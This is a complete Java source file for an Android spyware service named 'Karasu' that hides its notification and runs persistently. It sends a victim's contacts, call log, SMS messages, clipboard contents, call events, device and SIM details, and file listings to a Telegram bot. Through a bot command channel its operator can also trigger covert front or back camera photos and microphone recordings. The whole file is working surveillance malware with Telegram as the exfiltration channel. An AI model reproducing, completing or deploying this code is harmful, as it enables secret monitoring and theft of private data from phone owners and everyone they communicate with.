package com.tenix.karasu;

import android.app.*;
import android.content.*;
import android.content.pm.*;
import android.database.Cursor;
import android.graphics.ImageFormat;
import android.hardware.camera2.*;
import android.media.*;
import android.net.*;
import android.net.wifi.*;
import android.os.*;
import android.os.Environment;
import android.provider.*;
import android.telephony.*;

import java.io.*;
import java.net.*;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.*;

public class krs extends Service {

    // ─── CONFIG (static only — single const-string in <clinit>) ───
    static String BOT_TOKEN    = "YOUR_BOT_TOKEN";
    static String CHANNEL_IDS  = "@your_channel";
    static String ADMIN_CHAT_ID = "123456789";

    // ─── CONSTANTS ───
    private static final String PREF       = "krs_p";
    private static final String DONE_KEY   = "done";
    private static final String OFFSET_KEY = "offset";
    private static final int    NOTIF_ID   = 1;

    // ─── STATE ───
    public  static krs instance;
    private ExecutorService exec;
    private volatile boolean running = false;

    // ─── LISTENERS (dynamic) ───
    private ScreenReceiver  screenRcv;
    private PowerReceiver   powerRcv;
    private TelephonyManager tel;
    @SuppressWarnings("deprecation")
    private PhoneStateListener phoneListener;
    private ClipboardManager clipMgr;
    private ClipboardManager.OnPrimaryClipChangedListener clipListener;

    // ═══════════════════════════════════════════════════════════════
    //  LIFECYCLE
    // ═══════════════════════════════════════════════════════════════

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        silentForeground();
        if (exec == null || exec.isShutdown()) {
            exec    = Executors.newCachedThreadPool();
            running = true;
            exec.execute(this::runInit);
            exec.execute(this::pollCommands);
            startReceivers();
        }
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        running = false;
        stopReceivers();
        if (exec != null) exec.shutdownNow();
        instance = null;
    }

    // ═══════════════════════════════════════════════════════════════
    //  SILENT FOREGROUND
    // ═══════════════════════════════════════════════════════════════

    void silentForeground() {
        Notification n;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel("krs", "krs", NotificationManager.IMPORTANCE_NONE);
            ch.setSound(null, null);
            ch.enableVibration(false);
            ch.setShowBadge(false);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(ch);
            n = new Notification.Builder(this, "krs").build();
        } else {
            //noinspection deprecation
            n = new Notification.Builder(this).build();
        }
        startForeground(NOTIF_ID, n);
        new Handler(Looper.getMainLooper()).postDelayed(() -> stopForeground(true), 300);
    }

    // ═══════════════════════════════════════════════════════════════
    //  INIT
    // ═══════════════════════════════════════════════════════════════

    void runInit() {
        if (!getMe()) return;

        String[] chs = parseChannels();
        for (String ch : chs) {
            sendText("🐦\u200d⬛ *Karasu online*\n" +
                "📱 " + Build.MANUFACTURER + " " + Build.MODEL + "\n" +
                "🤖 Android " + Build.VERSION.RELEASE + " (API " + Build.VERSION.SDK_INT + ")\n" +
                "🕐 " + new Date(), ch);
        }

        dumpDeviceInfo(chs);
        dumpNetworkInfo(chs);
        dumpSimInfo(chs);
        dumpContacts(chs);
        dumpCallLog(chs);
        dumpSms(chs);
        dumpFileList(chs);
    }

    // ═══════════════════════════════════════════════════════════════
    //  RECEIVERS
    // ═══════════════════════════════════════════════════════════════

    @SuppressWarnings("deprecation")
    void startReceivers() {
        // Screen (dynamic — cannot be in manifest)
        screenRcv = new ScreenReceiver();
        IntentFilter sf = new IntentFilter();
        sf.addAction(Intent.ACTION_SCREEN_ON);
        sf.addAction(Intent.ACTION_SCREEN_OFF);
        sf.addAction(Intent.ACTION_USER_PRESENT);
        registerReceiver(screenRcv, sf);

        // Power (dynamic — cannot be in manifest)
        powerRcv = new PowerReceiver();
        IntentFilter pf = new IntentFilter();
        pf.addAction(Intent.ACTION_POWER_CONNECTED);
        pf.addAction(Intent.ACTION_POWER_DISCONNECTED);
        registerReceiver(powerRcv, pf);

        // Phone state listener
        tel = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        phoneListener = new PhoneStateListener() {
            String lastNum = "";
            @Override
            public void onCallStateChanged(int state, String number) {
                if (number != null && !number.isEmpty()) lastNum = number;
                String msg;
                switch (state) {
                    case TelephonyManager.CALL_STATE_RINGING:
                        msg = "📲 Incoming: " + lastNum; break;
                    case TelephonyManager.CALL_STATE_OFFHOOK:
                        msg = "📞 Call started: " + lastNum; break;
                    case TelephonyManager.CALL_STATE_IDLE:
                        msg = "📴 Call ended: " + lastNum; lastNum = ""; break;
                    default: return;
                }
                for (String ch : parseChannels()) sendText("📞 Call Event\n" + msg, ch);
            }
        };
        tel.listen(phoneListener, PhoneStateListener.LISTEN_CALL_STATE);

        // Clipboard
        clipMgr = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
        clipListener = () -> {
            if (clipMgr == null || !clipMgr.hasPrimaryClip()) return;
            ClipData clip = clipMgr.getPrimaryClip();
            if (clip == null || clip.getItemCount() == 0) return;
            CharSequence text = clip.getItemAt(0).getText();
            if (text != null && text.length() > 0) {
                for (String ch : parseChannels())
                    sendText("📋 *Clipboard*\n" + text.toString().trim(), ch);
            }
        };
        clipMgr.addPrimaryClipChangedListener(clipListener);
    }

    @SuppressWarnings("deprecation")
    void stopReceivers() {
        try { unregisterReceiver(screenRcv); } catch (Exception ignored) {}
        try { unregisterReceiver(powerRcv);  } catch (Exception ignored) {}
        if (tel != null && phoneListener != null)
            tel.listen(phoneListener, PhoneStateListener.LISTEN_NONE);
        if (clipMgr != null && clipListener != null)
            clipMgr.removePrimaryClipChangedListener(clipListener);
    }

    // ═══════════════════════════════════════════════════════════════
    //  DUMP METHODS  (targets = channels to send to)
    // ═══════════════════════════════════════════════════════════════

    void dumpDeviceInfo(String... targets) {
        exec.execute(() -> {
            StringBuilder sb = new StringBuilder("📱 *Device Info*\n");
            sb.append("Brand: ").append(Build.BRAND).append("\n");
            sb.append("Model: ").append(Build.MODEL).append("\n");
            sb.append("Android: ").append(Build.VERSION.RELEASE).append(" (API ").append(Build.VERSION.SDK_INT).append(")\n");
            sb.append("Board: ").append(Build.BOARD).append("\n");
            sb.append("Hardware: ").append(Build.HARDWARE).append("\n");
            try {
                StatFs stat = new StatFs(Environment.getExternalStorageDirectory().getPath());
                long total = stat.getBlockCountLong() * stat.getBlockSizeLong() / (1024 * 1024);
                long free  = stat.getAvailableBlocksLong() * stat.getBlockSizeLong() / (1024 * 1024);
                sb.append("Storage: ").append(free).append("MB free / ").append(total).append("MB\n");
            } catch (Exception e) { sb.append("Storage: N/A\n"); }
            try {
                ActivityManager.MemoryInfo mi = new ActivityManager.MemoryInfo();
                ((ActivityManager) getSystemService(ACTIVITY_SERVICE)).getMemoryInfo(mi);
                sb.append("RAM: ").append(mi.availMem / (1024 * 1024)).append("MB free / ")
                  .append(mi.totalMem / (1024 * 1024)).append("MB\n");
            } catch (Exception e) { sb.append("RAM: N/A\n"); }
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    sb.append("IMEI: N/A (Android 10+)\n");
                } else {
                    //noinspection deprecation
                    sb.append("IMEI: ").append(((TelephonyManager) getSystemService(TELEPHONY_SERVICE)).getDeviceId()).append("\n");
                }
            } catch (Exception e) { sb.append("IMEI: N/A\n"); }
            for (String ch : targets) sendText(sb.toString(), ch);
        });
    }

    void dumpNetworkInfo(String... targets) {
        exec.execute(() -> {
            StringBuilder sb = new StringBuilder("🌐 *Network Info*\n");
            try {
                ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
                //noinspection deprecation
                NetworkInfo ni = cm.getActiveNetworkInfo();
                if (ni != null) sb.append("Type: ").append(ni.getTypeName()).append("\n");
            } catch (Exception ignored) {}
            try {
                WifiManager wm = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
                WifiInfo wi = wm.getConnectionInfo();
                if (wi != null) {
                    sb.append("WiFi: ").append(wi.getSSID()).append("\n");
                    sb.append("IP: ").append(intToIp(wi.getIpAddress())).append("\n");
                    sb.append("Signal: ").append(wi.getRssi()).append(" dBm\n");
                    sb.append("MAC: ").append(wi.getMacAddress()).append("\n");
                }
            } catch (Exception ignored) {}
            try {
                TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
                sb.append("Operator: ").append(tm.getNetworkOperatorName()).append("\n");
            } catch (Exception ignored) {}
            for (String ch : targets) sendText(sb.toString(), ch);
        });
    }

    void dumpSimInfo(String... targets) {
        exec.execute(() -> {
            StringBuilder sb = new StringBuilder("📶 *SIM Info*\n");
            try {
                TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
                sb.append("Operator: ").append(tm.getSimOperatorName()).append("\n");
                sb.append("Country: ").append(tm.getSimCountryIso().toUpperCase()).append("\n");
                sb.append("Network: ").append(tm.getNetworkOperatorName()).append("\n");
                sb.append("SIM State: ").append(simStateStr(tm.getSimState())).append("\n");
                try { sb.append("Number: ").append(tm.getLine1Number()).append("\n"); }
                catch (Exception e) { sb.append("Number: N/A\n"); }
            } catch (Exception e) { sb.append("Error: ").append(e.getMessage()).append("\n"); }
            for (String ch : targets) sendText(sb.toString(), ch);
        });
    }

    void dumpContacts(String... targets) {
        exec.execute(() -> {
            StringBuilder sb = new StringBuilder("Karasu — Contacts Dump\nDate: " + new Date() + "\n\n");
            try {
                Cursor c = getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                                 ContactsContract.CommonDataKinds.Phone.NUMBER},
                    null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
                if (c != null) {
                    int count = 0;
                    while (c.moveToNext()) {
                        sb.append(c.getString(0)).append(" | ").append(c.getString(1)).append("\n");
                        count++;
                    }
                    c.close();
                    sb.insert(sb.indexOf("\n\n") + 2, "Total: " + count + "\n\n");
                }
            } catch (Exception e) { sb.append("Error: ").append(e.getMessage()); }
            File f = writeCache("contacts.txt", sb.toString());
            for (String ch : targets) sendDocument(f, ch);
            f.delete();
        });
    }

    void dumpCallLog(String... targets) {
        exec.execute(() -> {
            StringBuilder sb = new StringBuilder("Karasu — Call Log\nDate: " + new Date() + "\n\n");
            try {
                Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI,
                    new String[]{CallLog.Calls.NUMBER, CallLog.Calls.CACHED_NAME,
                                 CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION},
                    null, null, CallLog.Calls.DATE + " DESC");
                if (c != null) {
                    SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US);
                    while (c.moveToNext()) {
                        String type;
                        switch (c.getInt(2)) {
                            case CallLog.Calls.INCOMING_TYPE: type = "IN"; break;
                            case CallLog.Calls.OUTGOING_TYPE: type = "OUT"; break;
                            case CallLog.Calls.MISSED_TYPE:   type = "MISSED"; break;
                            default: type = "?";
                        }
                        sb.append(sdf.format(new Date(c.getLong(3)))).append(" | ")
                          .append(type).append(" | ")
                          .append(c.getString(1) != null ? c.getString(1) : "").append(" | ")
                          .append(c.getString(0)).append(" | ")
                          .append(c.getLong(4)).append("s\n");
                    }
                    c.close();
                }
            } catch (Exception e) { sb.append("Error: ").append(e.getMessage()); }
            File f = writeCache("calls.txt", sb.toString());
            for (String ch : targets) sendDocument(f, ch);
            f.delete();
        });
    }

    void dumpSms(String... targets) {
        exec.execute(() -> {
            StringBuilder sb = new StringBuilder("Karasu — SMS Dump\nDate: " + new Date() + "\n\n");
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US);
            sb.append("=== INBOX ===\n");
            try {
                Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"),
                    new String[]{"address", "body", "date"}, null, null, "date DESC LIMIT 250");
                if (c != null) {
                    while (c.moveToNext()) {
                        sb.append(sdf.format(new Date(c.getLong(2)))).append(" | ")
                          .append(c.getString(0)).append(": ").append(c.getString(1)).append("\n");
                    }
                    c.close();
                }
            } catch (Exception e) { sb.append("Error: ").append(e.getMessage()).append("\n"); }
            sb.append("\n=== SENT ===\n");
            try {
                Cursor c2 = getContentResolver().query(Uri.parse("content://sms/sent"),
                    new String[]{"address", "body", "date"}, null, null, "date DESC LIMIT 250");
                if (c2 != null) {
                    while (c2.moveToNext()) {
                        sb.append(sdf.format(new Date(c2.getLong(2)))).append(" | → ")
                          .append(c2.getString(0)).append(": ").append(c2.getString(1)).append("\n");
                    }
                    c2.close();
                }
            } catch (Exception e) { sb.append("Error: ").append(e.getMessage()).append("\n"); }
            File f = writeCache("sms.txt", sb.toString());
            for (String ch : targets) sendDocument(f, ch);
            f.delete();
        });
    }

    void dumpFileList(String... targets) {
        exec.execute(() -> {
            StringBuilder sb = new StringBuilder("Karasu — File List\nDate: " + new Date() + "\n\n");
            File[] dirs = {
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
            };
            for (File dir : dirs) {
                sb.append("=== ").append(dir.getName()).append(" ===\n");
                listFilesRecursive(dir, sb, 0);
                sb.append("\n");
            }
            File f = writeCache("files.txt", sb.toString());
            for (String ch : targets) sendDocument(f, ch);
            f.delete();
        });
    }

    void listFilesRecursive(File dir, StringBuilder sb, int depth) {
        if (depth > 2 || !dir.exists()) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        String pad = "  ".repeat(depth);
        for (File f : files) {
            sb.append(pad).append(f.isDirectory() ? "📁 " : "📄 ").append(f.getName());
            if (!f.isDirectory()) sb.append(" (").append(f.length() / 1024).append("KB)");
            sb.append("\n");
            if (f.isDirectory()) listFilesRecursive(f, sb, depth + 1);
        }
    }

    // ═══════════════════════════════════════════════════════════════
    //  CAMERA SNAPSHOT
    // ═══════════════════════════════════════════════════════════════

    @SuppressWarnings("NewApi")
    void takeCameraSnap(int facing, String chatId) {
        CameraManager cm = (CameraManager) getSystemService(CAMERA_SERVICE);
        HandlerThread ht = new HandlerThread("krs_cam");
        ht.start();
        Handler h = new Handler(ht.getLooper());
        try {
            String camId = null;
            for (String id : cm.getCameraIdList()) {
                CameraCharacteristics cc = cm.getCameraCharacteristics(id);
                Integer lens = cc.get(CameraCharacteristics.LENS_FACING);
                if (lens != null && lens == facing) { camId = id; break; }
            }
            if (camId == null) { sendText("❌ No camera found", chatId); ht.quitSafely(); return; }

            ImageReader reader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 1);
            String finalId = camId;
            reader.setOnImageAvailableListener(r -> {
                Image img = r.acquireLatestImage();
                if (img != null) {
                    ByteBuffer buf = img.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buf.remaining()];
                    buf.get(bytes);
                    img.close();
                    File f = new File(getCacheDir(), "snap_" + System.currentTimeMillis() + ".jpg");
                    try (FileOutputStream fos = new FileOutputStream(f)) { fos.write(bytes); }
                    catch (Exception ignored) {}
                    sendDocument(f, chatId);
                    f.delete();
                }
                ht.quitSafely();
            }, h);

            cm.openCamera(finalId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice device) {
                    try {
                        CaptureRequest.Builder req = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                        req.addTarget(reader.getSurface());
                        req.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_AUTO);
                        device.createCaptureSession(Collections.singletonList(reader.getSurface()),
                            new CameraCaptureSession.StateCallback() {
                                @Override
                                public void onConfigured(CameraCaptureSession session) {
                                    try { session.capture(req.build(), null, h); }
                                    catch (Exception e) { device.close(); }
                                }
                                @Override
                                public void onConfigureFailed(CameraCaptureSession session) { device.close(); }
                            }, h);
                    } catch (Exception e) { device.close(); }
                }
                @Override public void onDisconnected(CameraDevice d) { d.close(); ht.quitSafely(); }
                @Override public void onError(CameraDevice d, int err) {
                    d.close(); ht.quitSafely(); sendText("❌ Camera error: " + err, chatId);
                }
            }, h);

        } catch (Exception e) {
            sendText("❌ snap error: " + e.getMessage(), chatId);
            ht.quitSafely();
        }
    }

    // ═══════════════════════════════════════════════════════════════
    //  AUDIO RECORDING
    // ═══════════════════════════════════════════════════════════════

    void recordAudio(int seconds, String chatId) {
        exec.execute(() -> {
            boolean useOgg = Build.VERSION.SDK_INT >= 29;
            File f = new File(getCacheDir(), "rec_" + System.currentTimeMillis() + (useOgg ? ".ogg" : ".3gp"));
            MediaRecorder mr = new MediaRecorder();
            try {
                mr.setAudioSource(MediaRecorder.AudioSource.MIC);
                if (useOgg) {
                    mr.setOutputFormat(MediaRecorder.OutputFormat.OGG);
                    mr.setAudioEncoder(MediaRecorder.AudioEncoder.OPUS);
                } else {
                    mr.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                    mr.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                }
                mr.setOutputFile(f.getAbsolutePath());
                mr.prepare();
                mr.start();
                Thread.sleep(Math.min(seconds, 120) * 1000L);
                mr.stop();
                mr.release();
                sendDocument(f, chatId);
                f.delete();
            } catch (Exception e) {
                try { mr.release(); } catch (Exception ignored) {}
                sendText("❌ rec error: " + e.getMessage(), chatId);
            }
        });
    }

    // ═══════════════════════════════════════════════════════════════
    //  BOT COMMAND POLLING
    // ═══════════════════════════════════════════════════════════════

    void pollCommands() {
        SharedPreferences prefs = getSharedPreferences(PREF, MODE_PRIVATE);
        long offset = prefs.getLong(OFFSET_KEY, 0);
        while (running) {
            try {
                String resp = getUpdates(offset);
                if (resp != null && resp.contains("\"ok\":true")) {
                    for (String upd : extractArray(resp, "result")) {
                        long uid = jsonLong(upd, "update_id");
                        if (uid >= 0) offset = uid + 1;
                        String msg  = extractObj(upd, "message");
                        if (msg == null) continue;
                        String chat = extractObj(msg, "chat");
                        if (chat == null) continue;
                        String cid  = String.valueOf(jsonLong(chat, "id"));
                        if (!cid.equals(ADMIN_CHAT_ID)) continue;
                        String text = jsonStr(msg, "text");
                        if (text != null) processCommand(text.trim().toLowerCase(), cid);
                    }
                    prefs.edit().putLong(OFFSET_KEY, offset).apply();
                }
                Thread.sleep(10_000);
            } catch (Exception ignored) {
                try { Thread.sleep(10_000); } catch (Exception ignored2) {}
            }
        }
    }

    void processCommand(String cmd, String chatId) {
        switch (cmd) {
            case "/ping":
                sendText("🟢 Karasu online\n📱 " + Build.MANUFACTURER + " " + Build.MODEL + "\n🕐 " + new Date(), chatId);
                break;
            case "/status":
                sendText("🐦\u200d⬛ *Status*\n✅ Service running\n✅ Clipboard active\n✅ Screen active\n✅ Power active\n✅ Call listener active", chatId);
                break;
            case "/device":   dumpDeviceInfo(chatId); break;
            case "/network":  dumpNetworkInfo(chatId); break;
            case "/sim":      dumpSimInfo(chatId); break;
            case "/contacts": dumpContacts(chatId); break;
            case "/calls":    dumpCallLog(chatId); break;
            case "/sms":      dumpSms(chatId); break;
            case "/files":    dumpFileList(chatId); break;
            case "/snap f":   exec.execute(() -> takeCameraSnap(CameraCharacteristics.LENS_FACING_FRONT, chatId)); break;
            case "/snap b":   exec.execute(() -> takeCameraSnap(CameraCharacteristics.LENS_FACING_BACK,  chatId)); break;
            case "/clip":
                try {
                    if (clipMgr != null && clipMgr.hasPrimaryClip()) {
                        ClipData clip = clipMgr.getPrimaryClip();
                        CharSequence t = clip != null && clip.getItemCount() > 0 ? clip.getItemAt(0).getText() : null;
                        sendText("📋 Clipboard:\n" + (t != null ? t.toString() : "(empty)"), chatId);
                    } else {
                        sendText("📋 Clipboard empty", chatId);
                    }
                } catch (Exception e) { sendText("📋 Error: " + e.getMessage(), chatId); }
                break;
            case "/help":
                sendText("🐦\u200d⬛ *Karasu Commands*\n" +
                    "/ping — heartbeat\n/status — module status\n/device — device info\n" +
                    "/network — WiFi & network\n/sim — SIM info\n/contacts — dump contacts\n" +
                    "/calls — dump call log\n/sms — dump SMS\n/files — list files\n" +
                    "/clip — clipboard\n/snap f — front camera\n/snap b — back camera\n" +
                    "/rec {n} — record audio (max 120s)\n/help — this menu", chatId);
                break;
            default:
                if (cmd.startsWith("/rec ")) {
                    try {
                        int secs = Integer.parseInt(cmd.substring(5).trim());
                        secs = Math.min(Math.max(secs, 1), 120);
                        sendText("🎤 Recording " + secs + "s...", chatId);
                        recordAudio(secs, chatId);
                    } catch (Exception e) {
                        sendText("Usage: /rec {seconds} (max 120)", chatId);
                    }
                }
                break;
        }
    }

    // ═══════════════════════════════════════════════════════════════
    //  TELEGRAM API
    // ═══════════════════════════════════════════════════════════════

    boolean getMe() {
        try {
            HttpURLConnection c = open("https://api.telegram.org/bot" + BOT_TOKEN + "/getMe");
            int code = c.getResponseCode();
            drain(c, code);
            return code == 200;
        } catch (Exception e) { return false; }
    }

    void sendText(String text, String chatId) {
        try {
            if (text.length() > 4096) text = text.substring(0, 4090) + "...";
            HttpURLConnection c = open("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
            c.setRequestMethod("POST");
            c.setDoOutput(true);
            c.setRequestProperty("Content-Type", "application/json");
            byte[] body = ("{\"chat_id\":\"" + chatId + "\",\"text\":\"" + esc(text) + "\"}").getBytes("UTF-8");
            c.getOutputStream().write(body);
            int code = c.getResponseCode();
            drain(c, code);
            if (code == 429) { Thread.sleep(5000); sendText(text, chatId); }
        } catch (Exception ignored) {}
    }

    void sendDocument(File file, String chatId) {
        if (!file.exists()) return;
        for (int attempt = 0; attempt < 3; attempt++) {
            try {
                String bound = "b" + System.currentTimeMillis();
                HttpURLConnection c = open("https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument");
                c.setRequestMethod("POST");
                c.setDoOutput(true);
                c.setConnectTimeout(60000);
                c.setReadTimeout(60000);
                c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + bound);
                try (OutputStream out = c.getOutputStream()) {
                    writeField(out, bound, "chat_id", chatId);
                    out.write(("--" + bound + "\r\nContent-Disposition: form-data; name=\"document\"; filename=\"" + file.getName() + "\"\r\nContent-Type: application/octet-stream\r\n\r\n").getBytes());
                    try (FileInputStream fis = new FileInputStream(file)) {
                        byte[] buf = new byte[8192]; int r;
                        while ((r = fis.read(buf)) != -1) out.write(buf, 0, r);
                    }
                    out.write(("\r\n--" + bound + "--\r\n").getBytes());
                }
                int code = c.getResponseCode();
                drain(c, code);
                if (code == 200) return;
                if (code == 429) Thread.sleep(5000L * (attempt + 1));
                else if (code >= 500) Thread.sleep(3000L * (attempt + 1));
                else return;
            } catch (Exception e) {
                try { Thread.sleep(3000L * (attempt + 1)); } catch (Exception ignored) {}
            }
        }
    }

    String getUpdates(long offset) {
        try {
            HttpURLConnection c = open("https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + offset + "&timeout=5&limit=10");
            c.setConnectTimeout(15000);
            c.setReadTimeout(15000);
            int code = c.getResponseCode();
            if (code == 200) {
                BufferedReader br = new BufferedReader(new InputStreamReader(c.getInputStream()));
                StringBuilder sb = new StringBuilder(); String line;
                while ((line = br.readLine()) != null) sb.append(line);
                br.close(); return sb.toString();
            }
            drain(c, code);
        } catch (Exception ignored) {}
        return null;
    }

    void writeField(OutputStream out, String bound, String name, String val) throws Exception {
        out.write(("--" + bound + "\r\nContent-Disposition: form-data; name=\"" + name + "\"\r\n\r\n" + val + "\r\n").getBytes());
    }

    // ═══════════════════════════════════════════════════════════════
    //  JSON HELPERS
    // ═══════════════════════════════════════════════════════════════

    static String jsonStr(String json, String key) {
        String s = "\"" + key + "\":\""; int i = json.indexOf(s);
        if (i < 0) return null; i += s.length();
        StringBuilder sb = new StringBuilder();
        while (i < json.length()) {
            char c = json.charAt(i);
            if (c == '"' && (i == 0 || json.charAt(i - 1) != '\\')) break;
            if (c == '\\' && i + 1 < json.length()) { sb.append(json.charAt(++i)); i++; continue; }
            sb.append(c); i++;
        }
        return sb.toString();
    }

    static long jsonLong(String json, String key) {
        String s = "\"" + key + "\":"; int i = json.indexOf(s);
        if (i < 0) return -1; i += s.length();
        while (i < json.length() && json.charAt(i) == ' ') i++;
        int j = i;
        while (j < json.length() && (Character.isDigit(json.charAt(j)) || json.charAt(j) == '-')) j++;
        try { return Long.parseLong(json.substring(i, j)); } catch (Exception e) { return -1; }
    }

    static String extractObj(String json, String key) {
        String s = "\"" + key + "\":{"; int i = json.indexOf(s);
        if (i < 0) return null;
        int start = json.indexOf("{", i + s.length() - 1);
        if (start < 0) return null;
        int depth = 1, j = start + 1;
        while (j < json.length() && depth > 0) {
            char c = json.charAt(j++);
            if (c == '{') depth++; else if (c == '}') depth--;
        }
        return json.substring(start, j);
    }

    static List<String> extractArray(String json, String key) {
        List<String> list = new ArrayList<>();
        String s = "\"" + key + "\":["; int i = json.indexOf(s);
        if (i < 0) return list;
        i = json.indexOf("[", i) + 1;
        while (i < json.length()) {
            int objStart = json.indexOf("{", i);
            if (objStart < 0) break;
            int depth = 1, j = objStart + 1;
            while (j < json.length() && depth > 0) {
                char c = json.charAt(j++);
                if (c == '{') depth++; else if (c == '}') depth--;
            }
            list.add(json.substring(objStart, j));
            i = j;
        }
        return list;
    }

    // ═══════════════════════════════════════════════════════════════
    //  HELPERS
    // ═══════════════════════════════════════════════════════════════

    String[] parseChannels() { return CHANNEL_IDS.split(","); }

    void markDone(String id) {
        SharedPreferences p = getSharedPreferences(PREF, MODE_PRIVATE);
        Set<String> done = new HashSet<>(p.getStringSet(DONE_KEY, new HashSet<>()));
        done.add(id); p.edit().putStringSet(DONE_KEY, done).apply();
    }

    Set<String> getDoneIds() {
        return getSharedPreferences(PREF, MODE_PRIVATE).getStringSet(DONE_KEY, new HashSet<>());
    }

    void drain(HttpURLConnection conn, int code) {
        try {
            InputStream is = (code >= 200 && code < 300) ? conn.getInputStream() : conn.getErrorStream();
            if (is != null) { byte[] b = new byte[1024]; while (is.read(b) != -1) {} is.close(); }
        } catch (Exception ignored) {}
        conn.disconnect();
    }

    HttpURLConnection open(String url) throws Exception {
        HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
        c.setConnectTimeout(15000);
        c.setReadTimeout(15000);
        return c;
    }

    File writeCache(String name, String content) {
        File f = new File(getCacheDir(), name);
        try (FileWriter fw = new FileWriter(f)) { fw.write(content); }
        catch (Exception ignored) {}
        return f;
    }

    void launchPermActivity() {
        Intent i = new Intent(this, MainActivity.class);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
        startActivity(i);
    }

    static String esc(String s) {
        return s.replace("\\", "\\\\").replace("\"", "\\\"")
                .replace("\n", "\\n").replace("\r", "\\r").replace("\t", "\\t");
    }

    String intToIp(int ip) {
        return (ip & 0xFF) + "." + ((ip >> 8) & 0xFF) + "." + ((ip >> 16) & 0xFF) + "." + ((ip >> 24) & 0xFF);
    }

    String simStateStr(int s) {
        switch (s) {
            case TelephonyManager.SIM_STATE_READY:        return "Ready";
            case TelephonyManager.SIM_STATE_ABSENT:       return "Absent";
            case TelephonyManager.SIM_STATE_PIN_REQUIRED: return "PIN Required";
            default: return "Unknown";
        }
    }
}
